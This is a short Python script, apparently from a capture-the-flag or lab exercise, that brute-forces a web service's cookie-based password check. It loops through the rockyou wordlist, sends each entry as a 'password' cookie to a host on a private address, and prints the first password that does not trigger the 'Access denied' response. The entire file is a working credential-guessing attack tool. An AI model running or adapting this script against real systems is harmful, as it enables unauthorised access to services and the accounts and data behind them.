#!/usr/bin/env python
import requests

url = "http://10.0.0.102:8080"
wordlist = "/usr/share/wordlists/rockyou.txt"

f = open(wordlist,"r")
for passwd in f.readlines():
    headers = {'Cookie':'password='+passwd.strip()}
    r=requests.get(url, headers=headers)
    if not 'Access denied: password authentication cookie incorrect' in r.text:
        print ("PASSWORD => " + passwd)
        break
        
f.close()
